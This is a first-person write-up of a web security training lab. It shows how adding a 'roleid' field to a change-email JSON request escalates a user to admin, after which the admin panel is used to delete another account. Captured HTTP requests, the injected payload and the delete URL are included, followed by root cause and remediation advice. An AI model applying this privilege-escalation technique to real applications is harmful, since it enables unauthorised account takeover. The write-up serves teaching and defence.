# User Role Can Be Modified in User Profile

## Description

This lab has an admin panel at `/admin`. It's only accessible to logged-in users with a `roleid` of 2.

Solve the lab by accessing the admin panel and using it to delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`.

## Solution

### Step 1: Log in and explore

I accessed the lab and clicked on `My account`, which prompted a login page. I logged in using the given credentials `wiener:peter` and was redirected to `/my-account?id=wiener`.

### Step 2: Test the id parameter

I first considered whether simply changing the `id` parameter to `admin` or `administrator` would grant access to the admin panel. Trying both values did not work.

I then tried accessing `/admin` directly, but received:

```http
HTTP/2 401 Unauthorized
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2702
```

This indicated the server had proper access control on the `/admin` endpoint itself. I also inspected the application's JavaScript files for any leaked logic or hidden paths, but found nothing useful.

### Step 3: Inspect the change email functionality

I turned to the change email feature to see whether it exposed anything interesting. I updated the email for `wiener` to `ok@ok.com` and captured the request and response in Burp Suite:

Request:

```http
POST /my-account/change-email HTTP/2
Host: 0a79009803e05b5e805c94010028008a.web-security-academy.net
Cookie: session=TDDVp52d2l7N05kokd3mfe7o4KvQFjfv
Content-Length: 21
Sec-Ch-Ua-Platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Sec-Ch-Ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"
Dnt: 1
Content-Type: text/plain;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Origin: https://0a79009803e05b5e805c94010028008a.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a79009803e05b5e805c94010028008a.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=1, i

{"email":"ok@ok.com"}
```

Response:

```http
HTTP/2 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 113

{
  "username": "wiener",
  "email": "ok@ok.com",
  "apikey": "IoOGmDTphN9aelxaKwfwlaz3kDFvDUcr",
  "roleid": 1
}
```

The response revealed several fields beyond what is shown on the `/my-account` page, including `apikey` and `roleid`. Since the lab description specifically states that access to `/admin` is gated on a `roleid` of 2, this `roleid` field stood out as the relevant target.

### Step 4: Attempt to inject the roleid parameter

I modified the JSON body of the change email request to also include a `roleid` field:

```json
{"email":"ok@ok.com",
 "roleid": 2}
```

Response:

```json
{
  "username": "wiener",
  "email": "ok@ok.com",
  "apikey": "IoOGmDTphN9aelxaKwfwlaz3kDFvDUcr",
  "roleid": 2
}
```

The server accepted the extra, unexpected `roleid` field and persisted it, updating the account's role in the database, even though this field was never intended to be user-editable through this endpoint.

### Step 5: Access the admin panel

I navigated to `/my-account`, and the page now displayed a link to the admin panel in the HTML. With `roleid` now set to `2`, I was able to access `/admin` directly.

### Step 6: Delete the user carlos

I sent a request to:

```
https://0a79009803e05b5e805c94010028008a.web-security-academy.net/admin/delete?username=carlos
```

The user `carlos` was deleted, solving the lab.

## Root Cause

The `/my-account/change-email` endpoint binds the request body directly to the user's account object without restricting which fields can be modified. This is a mass assignment vulnerability: the endpoint was only meant to update the `email` field, but because the server does not explicitly allowlist which properties a client is permitted to set, an attacker can add an unexpected `roleid` field to the request body and have it accepted and persisted, effectively self-promoting to an administrator role.

## Remediation

- Explicitly allowlist the fields a client is permitted to modify on any update endpoint, rather than binding the entire request body to an internal data model.
- Never expose privilege-related fields such as `roleid` in API responses to the end user unless strictly necessary, and never accept them as user-controllable input.
- Enforce role changes only through dedicated, properly authorized administrative functionality, separate from routine profile updates like changing an email address.